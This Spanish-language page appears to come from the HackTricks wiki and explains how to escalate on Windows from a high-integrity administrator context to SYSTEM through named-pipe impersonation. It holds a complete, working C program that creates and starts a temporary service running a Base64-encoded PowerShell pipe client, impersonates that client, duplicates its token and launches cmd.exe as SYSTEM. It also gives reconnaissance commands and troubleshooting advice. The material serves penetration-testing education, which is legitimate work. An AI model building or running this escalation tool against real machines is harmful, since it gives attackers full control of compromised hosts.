# De High Integrity a SYSTEM con Name Pipes

{{#include ../../banners/hacktricks-training.md}}

Esta es la variante de **impersonación mediante named pipes para administrator/SCM**: un proceso con privilegios elevados crea un servicio temporal cuyo proceso hijo se conecta como `SYSTEM` y, posteriormente, impersona a ese cliente. Si el contexto inicial no puede crear servicios, pero tiene `SeImpersonatePrivilege`, utiliza en su lugar una coerción mediante un servicio privilegiado; consulta [Named Pipe Client Impersonation](named-pipe-client-impersonation.md) y [RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato](roguepotato-and-printspoofer.md). Crear el servicio requiere acceso al SCM y permisos `SERVICE_START` sobre el nuevo servicio, mientras que `CreateProcessWithTokenW` requiere `SeImpersonatePrivilege`.<sup>[[2]](#references)[[3]](#references)</sup>

Confirma rápidamente el contexto inicial esperado:
```cmd
whoami /groups | findstr /i "High Mandatory"
whoami /priv | findstr /i "SeImpersonatePrivilege"
sc.exe query PiperSrv
```
**Flujo del código:**

1. Crea el servidor de named pipe **antes** de iniciar el servicio. Al esperar, trata que `ConnectNamedPipe` devuelva `FALSE` con `ERROR_PIPE_CONNECTED` como un resultado correcto: significa que el cliente ganó la carrera y se conectó entre `CreateNamedPipe` y `ConnectNamedPipe`.<sup>[[4]](#references)</sup>
2. Crea e inicia un servicio que se conectará al pipe creado y escribirá algo. El código del servicio ejecutará este código PS codificado: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
3. Después de que el servicio se conecte y escriba, llama a `ImpersonateNamedPipeClient`, abre el thread token resultante y duplícalo como un primary token.<sup>[[1]](#references)</sup>
4. Usa ese primary token para ejecutar `cmd.exe`.<sup>[[2]](#references)</sup>

Esta ruta asume que el caller puede crear/iniciar un servicio y posee los privilegios requeridos por `CreateProcessWithTokenW` (normalmente `SeImpersonatePrivilege`). Es una técnica de high-integrity-to-SYSTEM, no una primitive disponible para un usuario arbitrario con pocos privilegios.<sup>[[2]](#references)[[3]](#references)</sup>

> [!WARNING]
> Si la creación o el inicio del servicio fallan, el ejemplo no envía una señal al thread del pipe y puede esperar indefinidamente. Añade gestión de errores y un timeout para el pipe overlapped antes de usarlo fuera de un laboratorio. Usa también un nombre aleatorio para el pipe/servicio para evitar colisiones.

`ImpersonateNamedPipeClient` adopta el contexto asociado al **último mensaje leído**, por lo que una conexión por sí sola no es suficiente: haz que el cliente privilegiado escriba, verifica que `ReadFile` haya devuelto datos y solo entonces suplanta. Duplica el token de impersonation del thread en un token `TokenPrimary` con `SecurityImpersonation`; un primary token es lo que consume la API de creación de procesos.<sup>[[1]](#references)[[5]](#references)</sup>
```c
#include <windows.h>
#include <time.h>

#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")

#define PIPESRV "PiperSrv"
#define MESSAGE_SIZE 512

DWORD WINAPI ServiceGo(LPVOID lpParam) {

SC_HANDLE scManager;
SC_HANDLE scService;

scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

if (scManager == NULL) {
return FALSE;
}

// create Piper service
scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
"C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
NULL, NULL, NULL, NULL, NULL);

if (scService == NULL) {
//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
return FALSE;
}

// launch it
StartService(scService, 0, NULL);

// wait a bit and then cleanup
Sleep(10000);
DeleteService(scService);

CloseServiceHandle(scService);
CloseServiceHandle(scManager);
}

int main() {

LPCSTR sPipeName = "\\\\.\\pipe\\piper";
HANDLE hSrvPipe;
HANDLE th;
BOOL bPipeConn;
char pPipeBuf[MESSAGE_SIZE];
DWORD dBRead = 0;

HANDLE hImpToken;
HANDLE hNewToken;
STARTUPINFOW si;
PROCESS_INFORMATION pi;

// open pipe
hSrvPipe = CreateNamedPipeA(sPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

// create and run service
th = CreateThread(0, 0, ServiceGo, NULL, 0, 0);

// wait for the connection from the service
bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
if (!bPipeConn && GetLastError() == ERROR_PIPE_CONNECTED) {
bPipeConn = TRUE; // Client connected between CreateNamedPipe and ConnectNamedPipe
}
if (bPipeConn) {
if (!ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL) || dBRead == 0) {
return -6;
}

// impersonate the service (SYSTEM)
if (ImpersonateNamedPipeClient(hSrvPipe) == 0) {
return -1;
}

// wait for the service to cleanup
WaitForSingleObject(th, INFINITE);

// get a handle to impersonated token
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
return -2;
}

// create new primary token for new process
if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
TokenPrimary, &hNewToken)) {
return -4;
}

//Sleep(20000);
// spawn cmd.exe as full SYSTEM user
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL,
CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
return -5;
}

// revert back to original security context
RevertToSelf();

}

return 0;
}
```
### Diagnóstico de fallos

- `ConnectNamedPipe == FALSE` con `ERROR_PIPE_CONNECTED`: continuar; la pipe ya está conectada.<sup>[[4]](#references)</sup>
- `ImpersonateNamedPipeClient` falla con `ERROR_CANNOT_IMPERSONATE` (`1368`): confirmar que el cliente SYSTEM realmente escribió datos y que `ReadFile` se completó. También inspeccionar el nivel de impersonation solicitado por el cliente; los clientes con nivel de identificación/anónimo no se pueden impersonar completamente.<sup>[[1]](#references)</sup>
- `CreateProcessWithTokenW` falla con `ERROR_PRIVILEGE_NOT_HELD` (`1314`): el caller original no tiene `SeImpersonatePrivilege`. Desde un contexto de administrador de alta integridad, usar la ruta de copia del token documentada en [SeImpersonate from High To System](seimpersonate-from-high-to-system.md), o usar `CreateProcessAsUserW` mientras se impersona a SYSTEM si los privilegios requeridos están presentes.<sup>[[2]](#references)</sup>
- `CreateServiceA` devuelve `ERROR_SERVICE_EXISTS` (`1073`): eliminar la entrada obsoleta `PiperSrv` o aleatorizar `PIPESRV`; eliminar siempre el servicio temporal después del trigger.<sup>[[3]](#references)</sup>



## References

- [1] [Microsoft Learn — `ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [Microsoft Learn — `CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
- [4] [Microsoft Learn — `ConnectNamedPipe`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)
- [5] [Microsoft Learn — `DuplicateTokenEx`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
{{#include ../../banners/hacktricks-training.md}}
